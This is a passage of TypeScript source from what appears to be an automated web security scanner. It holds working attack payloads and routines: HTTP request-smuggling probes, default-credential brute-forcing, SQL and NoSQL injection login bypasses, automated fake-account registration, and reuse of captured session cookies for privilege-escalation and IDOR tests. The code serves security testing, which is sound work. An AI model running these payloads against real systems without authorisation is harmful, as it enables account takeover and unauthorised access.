        `Content-Type: application/x-www-form-urlencoded\r\n`,
        `Content-Length: 6\r\n`,
        `Transfer-Encoding: chunked\r\n`,
        `\r\n`,
        `0\r\n`,
        `\r\n`,
        `X`,  // extra byte read by backend
      ].join(""),
    },
    // TE.CL: Transfer-Encoding terminates body, back-end uses Content-Length
    {
      label: "TE.CL smuggling probe",
      raw: [
        `POST / HTTP/1.1\r\n`,
        `Host: ${host}\r\n`,
        `Content-Type: application/x-www-form-urlencoded\r\n`,
        `Content-Length: 3\r\n`,
        `Transfer-Encoding: chunked\r\n`,
        `\r\n`,
        `1\r\n`,
        `A\r\n`,
        `0\r\n`,
        `\r\n`,
      ].join(""),
    },
    // Obfuscated Transfer-Encoding header
    {
      label: "Obfuscated TE header probe",
      raw: [
        `POST / HTTP/1.1\r\n`,
        `Host: ${host}\r\n`,
        `Content-Length: 4\r\n`,
        `Transfer-Encoding: xchunked\r\n`,
        `Transfer-Encoding: chunked\r\n`,
        `\r\n`,
        `0\r\n`,
        `\r\n`,
      ].join(""),
    },
  ];

  // Get baseline timing
  if (!activeProbesAllowed()) return findings;
  if (!reserveScanRequest()) return findings;
  const baselineStart = Date.now();
  const baselineR = await probe(target.url, { timeoutMs: 6_000 });
  const baselineMs = Date.now() - baselineStart;
  if (!baselineR) {
    await onLog(`[${ts()}] Smuggling: baseline request failed — skipping`);
    return findings;
  }

  for (const { label, raw } of smugglingPayloads) {
    if (!activeProbesAllowed() || !reserveScanRequest()) break;
    const result = await new Promise<{ status: number | null; durationMs: number; error?: string }>((resolve) => {
      const t0 = Date.now();
      let settled = false;
      const finish = (value: { status: number | null; durationMs: number; error?: string }) => {
        if (settled) return;
        settled = true;
        resolve(value);
      };
      const authHeaderLines = Object.entries(getScanAuthHeaders())
        .filter(([name, value]) => /^[\w-]+$/.test(name) && !/[\r\n]/.test(value))
        .map(([name, value]) => `${name}: ${value}\r\n`)
        .join("");
      const requestWithAuth = raw.replace("\r\n", `\r\n${authHeaderLines}`);
      // Use raw socket for precise control
      const socket = u.protocol === "https:"
        ? tls.connect({ host, port, rejectUnauthorized: false })
        : net.connect({ host, port });
      const writeProbe = () => {
        socket.write(requestWithAuth);
        socket.setTimeout(6000);
      };
      socket.once(u.protocol === "https:" ? "secureConnect" : "connect", writeProbe);
      let received = "";
      socket.on("data", (d: Buffer) => { received += d.toString(); });
      socket.on("end",   () => {
        const statusMatch = received.match(/^HTTP\/[\d.]+ (\d+)/);
        const responseHeaders: Record<string, string> = {};
        for (const line of received.split("\r\n").slice(1)) {
          const separator = line.indexOf(":");
          if (separator > 0) responseHeaders[line.slice(0, separator).toLowerCase()] = line.slice(separator + 1).trim();
        }
        const status = statusMatch ? parseInt(statusMatch[1]!, 10) : null;
        if (status !== null && isWafChallengeResponse(status, responseHeaders)) {
          void noteWafChallengeDetected();
        }
        finish({ status, durationMs: Date.now() - t0 });
        socket.destroy();
      });
      socket.on("timeout", () => { finish({ status: null, durationMs: Date.now() - t0, error: "timeout" }); socket.destroy(); });
      socket.on("error",   (e: Error) => { finish({ status: null, durationMs: Date.now() - t0, error: e.message }); });
    });

    if (!result.status) continue;
    const isAnomaly = result.status === 400 || result.status === 500 || result.status === 501;
    const timingAnomaly = result.durationMs > baselineMs + 2000;
    if (isAnomaly || timingAnomaly) {
      findings.push({
        title: `Potential HTTP Request Smuggling — ${label}`,
        severity: "critical", verification: "suspected", confidence: 55,
        cvss: 9.8, cve: null,
        description: `An ambiguous HTTP request with both Content-Length and Transfer-Encoding headers produced an anomalous response (HTTP ${result.status}, ${result.durationMs}ms vs baseline ${baselineMs}ms). This may indicate the server processes CL/TE desynchronization differently from a front-end proxy, enabling request smuggling attacks.`,
        evidence: `Baseline: GET ${target.url} → HTTP ${baselineR.status} (${baselineMs}ms)\n${label}: POST → HTTP ${result.status} (${result.durationMs}ms)\nTiming anomaly: ${timingAnomaly} | Status anomaly: ${isAnomaly}\nPayload snippet: ${raw.slice(0, 200)}`,
        remediation: "Ensure front-end and back-end servers agree on how to handle ambiguous Content-Length/Transfer-Encoding. Normalise all requests at the load balancer. Disable HTTP/1.1 keep-alive if not needed. Use HTTP/2 end-to-end.",
      });
      await onLog(`[${ts()}] ⚠ HTTP SMUGGLING SIGNAL: ${label} → HTTP ${result.status} in ${result.durationMs}ms`);
      break;
    }
  }

  await onLog(`[${ts()}] HTTP request smuggling check complete — ${findings.length} finding(s)`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// COMPLIANCE MAPPING HELPER
// ═══════════════════════════════════════════════════════════════════════════════

const COMPLIANCE_MAP: Array<{
  pattern: RegExp;
  owasp?: string[];
  pci?: string[];
  nist?: string[];
}> = [
  { pattern: /SQL injection|SQLi/i,             owasp: ["A03"], pci: ["6.2.4"], nist: ["SI-10", "SA-11"] },
  { pattern: /XSS|Cross.Site Scripting/i,        owasp: ["A03"], pci: ["6.2.4"], nist: ["SI-10"] },
  { pattern: /SSTI|Template Injection/i,         owasp: ["A03"], pci: ["6.2.4"], nist: ["SI-10"] },
  { pattern: /XXE|XML External/i,               owasp: ["A05"], pci: ["6.2.4"], nist: ["SI-10"] },
  { pattern: /SSRF|Server.Side Request/i,        owasp: ["A10"], pci: ["6.2.4"], nist: ["SC-7"] },
  { pattern: /Path Traversal|Directory Traversal/i, owasp: ["A01"], pci: ["6.2.4"], nist: ["AC-3"] },
  { pattern: /Command Injection|OS Command/i,   owasp: ["A03"], pci: ["6.2.4"], nist: ["SI-10"] },
  { pattern: /JWT|JSON Web Token/i,             owasp: ["A02"], pci: ["8.2.2"], nist: ["IA-5", "SC-23"] },
  { pattern: /CORS|Cross-Origin/i,              owasp: ["A05"], pci: ["6.2.4"], nist: ["AC-4"] },
  { pattern: /CSRF|Cross.Site Request Forgery/i, owasp: ["A01"], pci: ["6.2.4"], nist: ["SC-23"] },
  { pattern: /Missing.*HSTS|HTTP Strict Transport/i, owasp: ["A05"], pci: ["4.2.1"], nist: ["SC-8"] },
  { pattern: /Missing.*CSP|Content.Security.Policy/i, owasp: ["A05"], pci: ["6.2.4"], nist: ["SC-5"] },
  { pattern: /Rate Limit|Brute.Force/i,         owasp: ["A07"], pci: ["8.3.4"], nist: ["AC-7"] },
  { pattern: /TLS|SSL|Certificate/i,            owasp: ["A02"], pci: ["4.2.1"], nist: ["SC-8", "SC-23"] },
  { pattern: /NoSQL Injection/i,                owasp: ["A03"], pci: ["6.2.4"], nist: ["SI-10"] },
  { pattern: /Subdomain Takeover/i,             owasp: ["A05"], pci: ["11.4.5"], nist: ["CM-6"] },
  { pattern: /Exposed.*Port|Dangerous.*Service/i, owasp: ["A05"], pci: ["1.3.2"], nist: ["CM-7"] },
  { pattern: /IDOR|Broken Object|Access Control/i, owasp: ["A01"], pci: ["7.2.2"], nist: ["AC-3"] },
  { pattern: /Deserialization/i,                owasp: ["A08"], pci: ["6.2.4"], nist: ["SI-10"] },
  { pattern: /Log4Shell|Spring4Shell/i,          owasp: ["A06"], pci: ["6.3.3"], nist: ["SI-2"] },
  { pattern: /CVE|Vulnerable Version/i,         owasp: ["A06"], pci: ["6.3.3"], nist: ["SI-2", "RA-5"] },
  { pattern: /Password|Credential|Secret|API Key/i, owasp: ["A02"], pci: ["8.3.1"], nist: ["IA-5"] },
  { pattern: /Host Header Injection/i,           owasp: ["A03"], pci: ["6.2.4"], nist: ["SI-10"] },
  { pattern: /CRLF|Response Splitting/i,         owasp: ["A03"], pci: ["6.2.4"], nist: ["SI-10"] },
  { pattern: /Request Smuggling/i,              owasp: ["A03"], pci: ["6.2.4"], nist: ["SC-5"] },
  { pattern: /SPF|DMARC|DKIM|Email/i,           owasp: ["A05"], pci: ["5.3.1"], nist: ["SC-5"] },
  { pattern: /Information Disclosure|Stack Trace|Version Disclosed/i, owasp: ["A05"], pci: ["6.2.4"], nist: ["SI-12"] },
  { pattern: /Clickjacking|X-Frame/i,           owasp: ["A04"], pci: ["6.2.4"], nist: ["AC-4"] },
  { pattern: /WAF Bypass/i,                     owasp: ["A05"], pci: ["6.4.1"], nist: ["SC-7"] },
];

function applyComplianceMapping(findings: RealFinding[]): void {
  for (const finding of findings) {
    for (const rule of COMPLIANCE_MAP) {
      if (rule.pattern.test(finding.title) || rule.pattern.test(finding.description ?? "")) {
        finding.compliance = {
          owasp: rule.owasp,
          pci:   rule.pci,
          nist:  rule.nist,
        };
        break;
      }
    }
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHASE 24 — OPEN REGISTRATION EXPLOITATION
// ═══════════════════════════════════════════════════════════════════════════════

/** Extract the first session-like cookie name=value from a Set-Cookie header. */
function extractSessionCookie(setCookieHeader: string): string | null {
  const m = setCookieHeader.match(
    /(?:^|,)\s*((?:PHPSESSID|JSESSIONID|session|sess|sid|auth|token|user_session|_session|access_token)[^;,]*)/i,
  );
  return m ? m[1].trim() : null;
}

/** Return true if the body / URL contain signs of an authenticated page. */
function hasAuthenticatedContent(body: string, finalUrl: string): boolean {
  const b = body.toLowerCase();
  return (
    ["log out", "logout", "sign out", "signout", "dashboard", "my account", "my profile", "welcome", "account settings"].some((s) => b.includes(s)) ||
    ["dashboard", "account", "profile", "home", "welcome"].some((s) => finalUrl.toLowerCase().includes(s))
  );
}

/** Build a URL-encoded form body from a record, CSRF token, and fake identity. */
function buildRegistrationBody(
  hiddenInputs: Record<string, string>,
  csrfToken: string | null,
  fakeData: Record<string, string>,
): string {
  const fields: Record<string, string> = {
    ...hiddenInputs,
    email: fakeData.email!,
    username: fakeData.username!,
    user: fakeData.username!,
    password: fakeData.password!,
    password_confirmation: fakeData.password!,
    confirm_password: fakeData.password!,
    password2: fakeData.password!,
    first_name: fakeData.firstName!,
    last_name: fakeData.lastName!,
    firstname: fakeData.firstName!,
    lastname: fakeData.lastName!,
    name: fakeData.name!,
    company: fakeData.company!,
    phone: fakeData.phone!,
    address: fakeData.address!,
    city: fakeData.city!,
    zip: fakeData.zip!,
    country: fakeData.country!,
  };
  if (csrfToken) {
    fields["_token"] = csrfToken;
    fields["csrf_token"] = csrfToken;
    fields["authenticity_token"] = csrfToken;
  }
  return Object.entries(fields).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join("&");
}

async function checkOpenRegistration(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (!activeProbesAllowed()) return findings;
  await onLog(`[${ts()}] [Phase 24] Testing open registration on ${target.url}...`);

  const regPaths = [
    "/register", "/signup", "/sign-up", "/account/register", "/user/register",
    "/users/register", "/create-account", "/register.php", "/signup.php",
  ];

  const rand = Math.random().toString(36).slice(2, 8);
  const fakeData: Record<string, string> = {
    email: `sentinelx${rand}@test.com`,
    username: `sentinel${rand}`,
    password: `SentX${rand}!@#`,
    firstName: "Sentinel",
    lastName: "XTest",
    name: `Sentinel ${rand}`,
    company: `TestCorp${rand}`,
    phone: `+1555${Math.floor(1_000_000 + Math.random() * 9_000_000)}`,
    address: "123 Test Street",
    city: "Testville",
    zip: "10001",
    country: "US",
  };

  for (const regPath of regPaths.slice(0, 6)) {
    if (!activeProbesAllowed()) break;
    const regUrl = target.url.replace(/\/$/, "") + regPath;
    const pageRes = await probe(regUrl, { timeoutMs: 8_000 });
    if (!pageRes || pageRes.status === 404 || pageRes.status === 410) continue;

    const hasForm = /<form[^>]*>/i.test(pageRes.body);
    const hasPasswordField = /type=['"]?password['"]?/i.test(pageRes.body);
    const hasEmailField = /type=['"]?email['"]?|name=['"]?email['"]?/i.test(pageRes.body);
    if (!hasForm || (!hasPasswordField && !hasEmailField)) continue;

    await onLog(`[${ts()}] [Phase 24] Registration form found at ${regUrl} — submitting fake identity...`);

    // Extract CSRF token
    const csrfMatch = pageRes.body.match(
      /(?:name=['"]_?(?:csrf|token|authenticity_token|_token)['"]\s+value=['"]([^'"]+)['"]|value=['"]([^'"]+)['"]\s+name=['"]_?(?:csrf|token|authenticity_token|_token)['"])/i,
    );
    const csrfToken = csrfMatch ? (csrfMatch[1] ?? csrfMatch[2] ?? null) : null;

    // Extract hidden inputs
    const hiddenInputs: Record<string, string> = {};
    const hiddenRe = /input[^>]+type=['"]?hidden['"]?[^>]*>/gi;
    let hm: RegExpExecArray | null;
    while ((hm = hiddenRe.exec(pageRes.body)) !== null) {
      const nm = hm[0].match(/name=['"]([^'"]+)['"]/i);
      const vm = hm[0].match(/value=['"]([^'"]*)['"]/i);
      if (nm && vm) hiddenInputs[nm[1]] = vm[1];
    }

    const pageCookies = pageRes.headers["set-cookie"] ?? "";
    const cookieHeader = pageCookies.split(",").map((c) => c.split(";")[0]!.trim()).filter(Boolean).join("; ");

    const submitRes = await probe(regUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": regUrl,
        ...(cookieHeader ? { "Cookie": cookieHeader } : {}),
      },
      body: buildRegistrationBody(hiddenInputs, csrfToken, fakeData),
      timeoutMs: 12_000,
      followRedirects: true,
    });
    if (!submitRes) continue;

    const sessionCookie = extractSessionCookie(submitRes.headers["set-cookie"] ?? "");
    const authenticated = hasAuthenticatedContent(submitRes.body, submitRes.finalUrl);

    if (sessionCookie && authenticated) {
      const masked = sessionCookie.slice(0, 12) + "****" + sessionCookie.slice(-4);
      storeCapturedSession(sessionCookie);
      findings.push({
        title: "Unauthorized Account Creation via Open Registration — Full Dashboard Access Granted",
        severity: "critical",
        verification: "verified",
        confidence: 90,
        cvss: 8.5,
        cve: null,
        description: `An account was automatically created at ${regUrl} using generated fake credentials without any verification gate (CAPTCHA, email confirmation, or manual approval). A valid session cookie was issued and authenticated application elements were observed. Any attacker can self-register and immediately access the application.`,
        evidence: `REGISTRATION URL: ${regUrl}\nEMAIL USED: ${fakeData.email}\nHTTP RESPONSE: ${submitRes.status}\nFINAL URL: ${submitRes.finalUrl}\nSESSION COOKIE (masked): ${masked}\nAUTH SIGNALS: ${["log out","logout","dashboard","account","welcome"].filter((s) => submitRes.body.toLowerCase().includes(s)).join(", ") || "redirect to authenticated URL"}`,
        remediation: "1. Require email verification before activating new accounts.\n2. Implement CAPTCHA or proof-of-work on registration forms.\n3. Rate-limit registration attempts per IP and per email domain.\n4. Ensure new accounts are sandboxed and cannot access sensitive data immediately.\n5. Consider invite-only or admin-approved registration for sensitive applications.",
        compliance: { owasp: ["A01:2021 – Broken Access Control", "A07:2021 – Identification and Authentication Failures"], pci: ["8.2.1", "6.3.3"], nist: ["IA-2", "AC-2"] },
      });
      await onLog(`[${ts()}] ⚠ CRITICAL: Open registration at ${regUrl} — account created, session established (${masked})`);
      return findings;
    }

    const bodyLower = submitRes.body.toLowerCase();
    if (bodyLower.includes("captcha") || bodyLower.includes("verify your email") || bodyLower.includes("confirmation email") || bodyLower.includes("check your email")) {
      findings.push({
        title: "Registration Form Present but Protected",
        severity: "low",
        verification: "informational",
        confidence: 30,
        cvss: 0,
        cve: null,
        description: `A registration form was found at ${regUrl} but automated submission was blocked by CAPTCHA or email verification — expected behaviour.`,
        evidence: `POST ${regUrl} → HTTP ${submitRes.status}\nProtection: ${["captcha","email verification","confirmation email"].filter((s) => bodyLower.includes(s)).join(", ")}`,
        remediation: "Ensure email verification is enforced server-side and cannot be bypassed by directly calling the activation endpoint.",
      });
      await onLog(`[${ts()}] [Phase 24] Registration form at ${regUrl} is gated (CAPTCHA / email verification)`);
      return findings;
    }
  }

  await onLog(`[${ts()}] [Phase 24] No open registration endpoint found`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHASE 25 — DEFAULT CREDENTIAL BRUTE-FORCE
// ═══════════════════════════════════════════════════════════════════════════════

const DEFAULT_CREDENTIALS: [string, string][] = [
  ["admin", "admin"], ["admin", "password"], ["admin", "admin123"], ["admin", "1234"],
  ["admin", "123456"], ["admin", "password123"], ["admin", "admin@123"], ["admin", "Admin1234!"],
  ["administrator", "admin"], ["administrator", "password"], ["root", "root"], ["root", "toor"],
  ["root", "password"], ["user", "user"], ["user", "password"], ["test", "test"],
  ["guest", "guest"], ["demo", "demo"], ["support", "support"], ["manager", "manager"],
];

async function checkDefaultCredentials(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (!activeProbesAllowed()) return findings;
  await onLog(`[${ts()}] [Phase 25] Testing default credential brute-force...`);

  const loginPaths = ["/login", "/signin", "/sign-in", "/admin/login", "/admin", "/user/login", "/auth/login", "/api/login", "/api/auth"];
  const FAIL_SIGNALS = ["invalid", "incorrect", "error", "failed", "wrong", "denied", "unauthorized"];

  for (const loginPath of loginPaths.slice(0, 5)) {
    if (!activeProbesAllowed()) break;
    const loginUrl = target.url.replace(/\/$/, "") + loginPath;
    const pageRes = await probe(loginUrl, { timeoutMs: 8_000 });
    if (!pageRes || pageRes.status === 404) continue;

    const hasLoginForm =
      /<form[^>]*>/i.test(pageRes.body) &&
      (/type=['"]?password['"]?/i.test(pageRes.body) || /name=['"]?pass/i.test(pageRes.body));
    if (!hasLoginForm) continue;

    await onLog(`[${ts()}] [Phase 25] Login form at ${loginUrl} — testing ${DEFAULT_CREDENTIALS.length} credential pairs...`);

    const csrfMatch = pageRes.body.match(
      /(?:name=['"]_?(?:csrf|token|authenticity_token|_token)['"]\s+value=['"]([^'"]+)['"]|value=['"]([^'"]+)['"]\s+name=['"]_?(?:csrf|token|authenticity_token|_token)['"])/i,
    );
    const csrfToken = csrfMatch ? (csrfMatch[1] ?? csrfMatch[2] ?? null) : null;
    const pageCookies = pageRes.headers["set-cookie"] ?? "";
    const cookieHeader = pageCookies.split(",").map((c) => c.split(";")[0]!.trim()).filter(Boolean).join("; ");

    let attempts = 0;
    for (const [username, password] of DEFAULT_CREDENTIALS) {
      if (!activeProbesAllowed() || attempts >= 20) break;
      attempts++;

      const fields: Record<string, string> = {
        username, user: username, email: username, login: username,
        password, pass: password,
        ...(csrfToken ? { _token: csrfToken, csrf_token: csrfToken } : {}),
      };
      const formBody = Object.entries(fields).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join("&");

      const r = await probe(loginUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "Referer": loginUrl,
          ...(cookieHeader ? { "Cookie": cookieHeader } : {}),
        },
        body: formBody,
        timeoutMs: 10_000,
        followRedirects: true,
      });
      if (!r) continue;

      const bodyLower = r.body.toLowerCase();
      const sessionCookie = extractSessionCookie(r.headers["set-cookie"] ?? "");
      const hasFail = FAIL_SIGNALS.some((s) => bodyLower.includes(s));
      const hasLoginForm2 = /<form[^>]*>/i.test(r.body) && /type=['"]?password['"]?/i.test(r.body);
      const hasAuth = ["log out","logout","dashboard","account","welcome","profile"].some((s) => bodyLower.includes(s));

      if (sessionCookie && !hasFail && !hasLoginForm2 && (hasAuth || r.status === 302)) {
        const masked = sessionCookie.slice(0, 12) + "****" + sessionCookie.slice(-4);
        storeCapturedSession(sessionCookie);
        findings.push({
          title: `Default Credentials — ${username}:${password} Grants Full Access`,
          severity: "critical",
          verification: "verified",
          confidence: 95,
          cvss: 9.8,
          cve: null,
          description: `The login endpoint at ${loginUrl} accepted default credentials (${username}:${password}). A valid session cookie was issued and the response contained authenticated application content. Any attacker with public knowledge of default credentials can authenticate as '${username}'.`,
          evidence: `LOGIN URL: ${loginUrl}\nCREDENTIALS: ${username}:${password}\nHTTP RESPONSE: ${r.status}\nFINAL URL: ${r.finalUrl}\nSESSION COOKIE (masked): ${masked}\nAUTH SIGNALS: ${["log out","logout","dashboard","account","welcome"].filter((s) => bodyLower.includes(s)).join(", ") || "HTTP redirect"}`,
          remediation: "1. Change all default credentials immediately.\n2. Implement account lockout after 5–10 failed attempts.\n3. Require strong, unique passwords for all privileged accounts.\n4. Audit all service accounts and change any using default passwords.\n5. Implement MFA for admin and privileged accounts.",
          compliance: { owasp: ["A07:2021 – Identification and Authentication Failures"], pci: ["8.3.6", "8.6.1"], nist: ["IA-5", "AC-7"] },
        });
        await onLog(`[${ts()}] ⚠ CRITICAL: Default credentials CONFIRMED — ${username}:${password} at ${loginUrl} (${masked})`);
        return findings;
      }
    }

    await onLog(`[${ts()}] [Phase 25] No default credentials accepted at ${loginUrl}`);
    break; // Only test the first valid login form found
  }

  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHASE 26 — SQL INJECTION AUTHENTICATION BYPASS
// ═══════════════════════════════════════════════════════════════════════════════

const SQLI_AUTH_PAYLOADS: { username: string; password: string; note: string }[] = [
  { username: "' OR '1'='1",           password: "anything",       note: "classic OR bypass" },
  { username: "' OR '1'='1' --",       password: "anything",       note: "OR bypass with comment" },
  { username: "admin'--",              password: "anything",       note: "admin comment bypass" },
  { username: "admin'/*",              password: "anything",       note: "admin block-comment" },
  { username: "' OR 1=1--",            password: "anything",       note: "numeric OR bypass" },
  { username: "') OR ('1'='1",         password: "anything",       note: "parenthesis bypass" },
  { username: "admin' #",              password: "anything",       note: "MySQL hash bypass" },
  { username: "' OR 'x'='x",          password: "' OR 'x'='x",   note: "full double-bypass" },
];

async function checkSqliAuthBypass(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  if (!activeProbesAllowed()) return findings;
  await onLog(`[${ts()}] [Phase 26] Testing SQL injection authentication bypass...`);

  const loginPaths = ["/login", "/signin", "/sign-in", "/admin/login", "/admin", "/user/login"];
  const AUTH_SIGNALS = ["log out","logout","dashboard","welcome","account","admin panel","control panel"];
  const FAIL_SIGNALS = ["invalid","incorrect","error","failed","wrong"];

  for (const loginPath of loginPaths.slice(0, 4)) {
    if (!activeProbesAllowed()) break;
    const loginUrl = target.url.replace(/\/$/, "") + loginPath;
    const pageRes = await probe(loginUrl, { timeoutMs: 8_000 });
    if (!pageRes || pageRes.status === 404) continue;

    const hasLoginForm = /<form[^>]*>/i.test(pageRes.body) && /type=['"]?password['"]?/i.test(pageRes.body);
    const isApiEndpoint = loginPath.startsWith("/api");
    if (!hasLoginForm && !isApiEndpoint) continue;

    await onLog(`[${ts()}] [Phase 26] Testing SQLi bypass payloads at ${loginUrl}...`);

    const csrfMatch = pageRes.body.match(
      /(?:name=['"]_?(?:csrf|token|authenticity_token|_token)['"]\s+value=['"]([^'"]+)['"]|value=['"]([^'"]+)['"]\s+name=['"]_?(?:csrf|token|authenticity_token|_token)['"])/i,
    );
    const csrfToken = csrfMatch ? (csrfMatch[1] ?? csrfMatch[2] ?? null) : null;
    const pageCookies = pageRes.headers["set-cookie"] ?? "";
    const cookieHeader = pageCookies.split(",").map((c) => c.split(";")[0]!.trim()).filter(Boolean).join("; ");

    for (const { username, password, note } of SQLI_AUTH_PAYLOADS) {
      if (!activeProbesAllowed()) break;

      const fields: Record<string, string> = {
        username, user: username, email: username, login: username,
        password, pass: password,
        ...(csrfToken ? { _token: csrfToken, csrf_token: csrfToken } : {}),
      };
      const formBody = Object.entries(fields).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join("&");

      const r = await probe(loginUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          "Referer": loginUrl,
          ...(cookieHeader ? { "Cookie": cookieHeader } : {}),
        },
        body: formBody,
        timeoutMs: 10_000,
        followRedirects: true,
      });
      if (!r) continue;

      const bodyLower = r.body.toLowerCase();
      const sessionCookie = extractSessionCookie(r.headers["set-cookie"] ?? "");
      const hasFail = FAIL_SIGNALS.some((s) => bodyLower.includes(s));
      const hasAuth = AUTH_SIGNALS.some((s) => bodyLower.includes(s));

      if (sessionCookie && !hasFail && (hasAuth || r.status === 302)) {
        const masked = sessionCookie.slice(0, 12) + "****" + sessionCookie.slice(-4);
        storeCapturedSession(sessionCookie);
        findings.push({
          title: "SQL Injection Authentication Bypass — Login as Administrator",
          severity: "critical",
          verification: "verified",
          confidence: 92,
          cvss: 9.8,
          cve: null,
          description: `SQL injection in the login form at ${loginUrl} allowed authentication bypass using the payload '${username}' (${note}). The server returned an authenticated session, confirming the SQL query is not using parameterised statements.`,
          evidence: `LOGIN URL: ${loginUrl}\nSQLi PAYLOAD (username): ${username}\nNOTE: ${note}\nHTTP RESPONSE: ${r.status}\nFINAL URL: ${r.finalUrl}\nSESSION COOKIE (masked): ${masked}\nAUTH SIGNALS: ${AUTH_SIGNALS.filter((s) => bodyLower.includes(s)).join(", ") || "HTTP redirect"}`,
          remediation: "1. Use parameterised queries (prepared statements) for ALL database interactions.\n2. Never concatenate user input into SQL strings.\n3. Use an ORM with strict binding (Drizzle, Hibernate, Sequelize).\n4. Apply input validation — allowlist characters for usernames.\n5. Review all authentication code for additional injection points.",
          compliance: { owasp: ["A03:2021 – Injection"], pci: ["6.3.3", "6.2.4"], nist: ["SI-10", "SA-11"] },
        });
        await onLog(`[${ts()}] ⚠ CRITICAL: SQLi auth bypass CONFIRMED at ${loginUrl} with payload: ${username}`);
        return findings;
      }
    }

    // Also try NoSQL injection on JSON login endpoints
    if (isApiEndpoint && activeProbesAllowed()) {
      const jsonPayload = JSON.stringify({ username: { $ne: "" }, password: { $ne: "" } });
      const rJson = await probe(loginUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: jsonPayload,
        timeoutMs: 10_000,
        followRedirects: true,
      });
      if (rJson) {
        const jb = rJson.body.toLowerCase();
        const jSession = extractSessionCookie(rJson.headers["set-cookie"] ?? "");
        if (jSession && !FAIL_SIGNALS.some((s) => jb.includes(s)) && (AUTH_SIGNALS.some((s) => jb.includes(s)) || rJson.status === 200)) {
          storeCapturedSession(jSession);
          findings.push({
            title: "NoSQL Injection Authentication Bypass — Login Without Credentials",
            severity: "critical",
            verification: "verified",
            confidence: 88,
            cvss: 9.8,
            cve: null,
            description: `NoSQL injection ({\"$ne\":\"\"}) at the JSON login endpoint ${loginUrl} returned an authenticated session without valid credentials. The server is passing user-supplied JSON objects directly into MongoDB query operators.`,
            evidence: `POST ${loginUrl}\nContent-Type: application/json\nBody: ${jsonPayload}\nHTTP ${rJson.status}\nAuth signals: ${AUTH_SIGNALS.filter((s) => jb.includes(s)).join(", ")}`,
            remediation: "Apply express-mongo-sanitize middleware. Strip all keys starting with '$' from user input. Use Mongoose strict mode.",
            compliance: { owasp: ["A03:2021 – Injection"], nist: ["SI-10"] },
          });
          await onLog(`[${ts()}] ⚠ CRITICAL: NoSQL injection auth bypass CONFIRMED at ${loginUrl}`);
          return findings;
        }
      }
    }

    break; // Only test the first valid login form
  }

  await onLog(`[${ts()}] [Phase 26] No SQL injection auth bypass confirmed`);
  return findings;
}

// ═══════════════════════════════════════════════════════════════════════════════
// PHASE 28 — IDOR WITH CAPTURED SESSION
// ═══════════════════════════════════════════════════════════════════════════════

async function checkIdorWithCapturedSession(target: Target, onLog: LogFn): Promise<RealFinding[]> {
  const findings: RealFinding[] = [];
  const capturedSession = getCapturedSession();
  if (!capturedSession || !activeProbesAllowed()) return findings;

  await onLog(`[${ts()}] [Phase 28] Testing IDOR / privilege escalation using captured session...`);

  const cookieHeader = capturedSession;
  const AUTH_PATHS = [
    "/profile", "/settings", "/account", "/dashboard", "/user", "/me",
    "/api/user", "/api/profile", "/api/me", "/api/account",
  ];
  const ADMIN_PATHS = ["/admin", "/admin/dashboard", "/admin/users", "/api/admin", "/api/admin/users"];

  // ── Role escalation via privilege-spoofing headers ─────────────────────────
  for (const adminPath of ADMIN_PATHS.slice(0, 3)) {
    if (!activeProbesAllowed()) break;
    const adminUrl = target.url.replace(/\/$/, "") + adminPath;
    const [normalRes, escalatedRes] = await Promise.all([
      probe(adminUrl, { headers: { "Cookie": cookieHeader }, timeoutMs: 8_000 }),
      probe(adminUrl, {
        headers: { "Cookie": cookieHeader, "X-Admin": "true", "Role": "admin", "X-User-Role": "admin", "X-Forwarded-User": "admin" },
        timeoutMs: 8_000,
      }),
    ]);
    if (!normalRes || !escalatedRes) continue;

    if (
      (normalRes.status === 403 || normalRes.status === 401) &&
      escalatedRes.status === 200 &&
      escalatedRes.body.length > 200
    ) {
      findings.push({
        title: "Privilege Escalation via Admin Headers — Unauthorized Admin Access",
        severity: "critical",
        verification: "suspected",
        confidence: 72,
        cvss: 9.1,
        cve: null,
        description: `The admin endpoint ${adminUrl} returned HTTP ${normalRes.status} with the low-privilege captured session but HTTP 200 when role-escalation headers (X-Admin: true, Role: admin) were added. The server trusts client-supplied role headers — any low-privilege user can escalate to admin.`,
        evidence: `SESSION: captured from Phase 24/25/26\nNORMAL: GET ${adminUrl} → HTTP ${normalRes.status} (${normalRes.body.length} bytes)\nESCALATED: GET ${adminUrl} + X-Admin:true + Role:admin → HTTP ${escalatedRes.status} (${escalatedRes.body.length} bytes)`,
        remediation: "1. Never trust client-supplied role or privilege headers.\n2. Derive all authorisation decisions exclusively from server-side session data.\n3. Implement RBAC checked server-side on every request.\n4. Audit all admin endpoints for header-based bypass.\n5. Add integration tests that assert admin endpoints reject requests with spoofed headers.",
        compliance: { owasp: ["A01:2021 – Broken Access Control"], pci: ["7.2.1"], nist: ["AC-3", "AC-6"] },
      });
      await onLog(`[${ts()}] ⚠ CRITICAL: Privilege escalation via admin headers at ${adminUrl}`);
    }
  }

  // ── IDOR: enumerate numeric IDs and attempt cross-user access ─────────────
  for (const authPath of AUTH_PATHS.slice(0, 6)) {
    if (!activeProbesAllowed()) break;
    const authUrl = target.url.replace(/\/$/, "") + authPath;
    const r = await probe(authUrl, { headers: { "Cookie": cookieHeader }, timeoutMs: 8_000 });
    if (!r || r.status === 404 || r.status === 401 || r.status === 403) continue;

    // Extract numeric IDs from the response body
    const bodyIdMatches = [...r.body.matchAll(/"(?:id|user_id|userId|account_id|accountId|order_id|orderId)":\s*(\d+)/g)].map((m) => parseInt(m[1]!));
